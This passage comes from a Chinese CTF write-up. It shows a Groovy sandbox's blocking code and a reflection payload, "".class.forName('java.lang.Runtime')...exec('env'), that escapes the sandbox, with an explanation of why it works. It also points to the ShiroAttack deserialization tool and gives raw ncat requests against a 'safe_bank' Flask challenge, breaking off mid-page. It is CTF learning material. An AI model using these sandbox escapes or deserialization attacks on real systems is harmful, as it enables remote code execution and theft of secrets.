class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> secureASTCustomizer<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token constant">STRING_METHODS</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>expressinject<span class="token punctuation">.</span></span><span class="token class-name">Test<span class="token punctuation">.</span>Groovy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">groovy<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">Grab</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">groovy<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">ASTTest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>ast<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>classgen<span class="token punctuation">.</span></span><span class="token class-name">GeneratorContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">CompilationFailedException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">CompilationUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">CompilePhase</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">SourceUnit</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>control<span class="token punctuation">.</span>customizers<span class="token punctuation">.</span></span><span class="token class-name">CompilationCustomizer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Annotation</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Phase3Purifiler</span> <span class="token keyword">extends</span> <span class="token class-name">CompilationCustomizer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token constant">BLOCKED_TRANSFORMS</span> <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">unmodifiableList</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>            <span class="token string">"ASTTest"</span><span class="token punctuation">,</span>            <span class="token string">"Grab"</span><span class="token punctuation">,</span>            <span class="token string">"GrabConfig"</span><span class="token punctuation">,</span>            <span class="token string">"GrabExclude"</span><span class="token punctuation">,</span>            <span class="token string">"GrabResolver"</span><span class="token punctuation">,</span>            <span class="token string">"Grapes"</span><span class="token punctuation">,</span>            <span class="token string">"AnnotationCollector"</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Phase3Purifiler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token class-name">CompilePhase</span><span class="token punctuation">.</span><span class="token constant">CONVERSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token class-name">SourceUnit</span> source<span class="token punctuation">,</span> <span class="token class-name">GeneratorContext</span> context<span class="token punctuation">,</span> <span class="token class-name">ClassNode</span> classNode<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CompilationFailedException</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">RejectASTTransformsVisitor</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">visitClass</span><span class="token punctuation">(</span>classNode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doPhaseOperation</span><span class="token punctuation">(</span><span class="token class-name">CompilationUnit</span> unit<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CompilationFailedException</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">doPhaseOperation</span><span class="token punctuation">(</span>unit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">needSortedInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">needSortedInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">RejectASTTransformsVisitor</span> <span class="token keyword">extends</span> <span class="token class-name">ClassCodeVisitorSupport</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token class-name">SourceUnit</span> source<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">RejectASTTransformsVisitor</span><span class="token punctuation">(</span><span class="token class-name">SourceUnit</span> source<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>source <span class="token operator">=</span> source<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">protected</span> <span class="token class-name">SourceUnit</span> <span class="token function">getSourceUnit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> source<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visitAnnotations</span><span class="token punctuation">(</span><span class="token class-name">AnnotatedNode</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">AnnotationNode</span> an <span class="token operator">:</span> node<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> blockedAnnotation <span class="token operator">:</span> <span class="token constant">BLOCKED_TRANSFORMS</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>an<span class="token punctuation">.</span><span class="token function">getClassNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>blockedAnnotation<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"Annotation "</span> <span class="token operator">+</span> blockedAnnotation <span class="token operator">+</span> <span class="token string">" cannot be used in the sandbox."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visitImports</span><span class="token punctuation">(</span><span class="token class-name">ModuleNode</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ImportNode</span> importNode <span class="token operator">:</span> node<span class="token punctuation">.</span><span class="token function">getImports</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">checkImportForBlockedAnnotation</span><span class="token punctuation">(</span>importNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ImportNode</span> importStaticNode <span class="token operator">:</span> node<span class="token punctuation">.</span><span class="token function">getStaticImports</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">checkImportForBlockedAnnotation</span><span class="token punctuation">(</span>importStaticNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkImportForBlockedAnnotation</span><span class="token punctuation">(</span><span class="token class-name">ImportNode</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> blockedAnnotation <span class="token operator">:</span> <span class="token constant">BLOCKED_TRANSFORMS</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>blockedAnnotation<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span><span class="token string">"Annotation "</span> <span class="token operator">+</span> node<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" cannot be used in the sandbox."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java">def process <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>'getRuntime'<span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token char">'env'</span><span class="token punctuation">)</span><span class="token comment">//process.waitFor()</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>啊，用第一题的payload直接出来了，这复仇了个寂寞。。。。</p><blockquote><ol><li>安全规则 <strong>只检查方法名是否在字符串方法白名单里</strong></li><li><code>getClass()</code> 不是字符串特有的方法（是所有对象共有的）</li><li>所以它 <strong>不在白名单检查范围</strong> 内</li></ol></blockquote><blockquote><ol><li><p><strong>检查器设计局限</strong>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 在您的检查器中，只针对特定类型的方法调用进行检查</span><span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 检查字符串方法</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>当调用 <code>"".class</code> 时：<ul><li><code>"".</code> 是 <code>String</code> 类型</li><li><code>.class</code> 实际上是 <code>Object.getClass()</code> 方法</li><li>但您的检查器只检查 <strong>直接在 String 类上声明的方法</strong>，不检查继承自 Object 的方法</li></ul></li></ul></li><li><p><strong>方法来源判断</strong>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 您的白名单只包含 String 类直接声明的方法</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token constant">STRING_METHODS</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>getClass()</code> 是 <code>Object</code> 类的方法，不是 <code>String</code> 直接声明的方法</li><li>因此它<strong>不在白名单检查范围</strong>内</li></ul></li><li><p><strong>类型系统盲点</strong>：</p><ul><li>当执行 <code>"".class</code> 时：<ul><li><code>getClass()</code> 方法调用发生在 <code>String</code> 实例上</li><li>但方法本身属于 <code>Object</code> 类</li><li>您的检查器没有考虑继承方法的处理</li></ul></li></ul></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 返回: [equals, toString, hashCode, compareTo, ...] (不包括 getClass)</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 返回: [getClass, wait, notify, ...]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><hr><h3 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a>JavaSeri</h3><p><a href="https://blog.csdn.net/weixin_59047731/article/details/138911404">shiro_attack工具-shiro反序列化漏洞的快速检测和利用_shiro attack-CSDN博客</a></p><p><a href="https://github.com/SummerSec/ShiroAttack2/issues/41">报错：找不到或无法加载主类 com.summersec.attack.UI.Main · Issue #41 · SummerSec/ShiroAttack2</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2f16e203b5c03d95bdd40a8b16b9ccfd.png"></p><p>利用shiro_attacker即可。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5d57b58413cb83f4b04e490ecc2289be.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/84352a953be8afb1128b8b6bbd41725b.png"></p><hr><h3 id="safe-bank"><a href="#safe-bank" class="headerlink" title="safe_bank"></a>safe_bank</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ncat <span class="token parameter variable">--ssl</span> nepctf32-bwvp-6lno-xsqe-fdssm7sec647.nepctf.com <span class="token number">443</span>GET / HTTP/1.1Host: nepctf32-bwvp-6lno-xsqe-fdssm7sec647.nepctf.comConnection: close<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>安全银行门户<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>        <span class="token operator">&lt;</span>form <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"/auth"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"form-group"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">&gt;</span>用户名:<span class="token operator">&lt;</span>/label<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"username"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"u"</span> required<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"form-group"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">&gt;</span>密码:<span class="token operator">&lt;</span>/label<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"p"</span> required<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>button <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span><span class="token operator">&gt;</span>登录<span class="token operator">&lt;</span>/button<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"nav"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/register"</span><span class="token operator">&gt;</span>注册账户<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span> <span class="token operator">|</span>            <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/about"</span><span class="token operator">&gt;</span>关于我们<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>GET /about HTTP/1.1Host: nepctf32-bwvp-6lno-xsqe-fdssm7sec647.nepctf.comConnection: close<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>关于安全银行<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"section"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>概述<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>安全银行是一个现代化的银行系统，提供对银行服务的安全访问。            我们的系统使用最先进的安全措施，包括安全cookies和            用户会话管理，确保您的数据保持安全。<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>          <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"section"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>技术细节<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>我们的平台使用Python Flask构建，并利用安全的会话管理系统。<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>我们使用以下技术：<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>ul<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>Python Flask作为Web框架<span class="token operator">&lt;</span>/li<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>JSON用于数据交换<span class="token operator">&lt;</span>/li<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>使用jsonpickle的高级会话管理<span class="token operator">&lt;</span>/li<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>Base64编码用于Token传输<span class="token operator">&lt;</span>/li<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>/ul<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>我们的会话令牌结构如下：<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"code"</span><span class="token operator">&gt;</span>Session <span class="token punctuation">{</span>    meta: <span class="token punctuation">{</span>        user: <span class="token string">"用户名"</span>,        ts: 时间戳    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"back-link"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token operator">&gt;</span>返回登录页面<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>GET /register HTTP/1.1Host: nepctf32-bwvp-6lno-xsqe-fdssm7sec647.nepctf.comConnection: close<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>注册新账户<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>        <span class="token operator">&lt;</span>form <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"/register"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"form-group"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">&gt;</span>用户名:<span class="token operator">&lt;</span>/label<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"username"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"username"</span> required<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"form-group"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">&gt;</span>密码:<span class="token operator">&lt;</span>/label<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"password"</span> required<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>div <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"form-group"</span><span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>label <span class="token assign-left variable">for</span><span class="token operator">=</span><span class="token string">"confirm_password"</span><span class="token operator">&gt;</span>确认密码:<span class="token operator">&lt;</span>/label<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"confirm_password"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"confirm_password"</span> required<span class="token 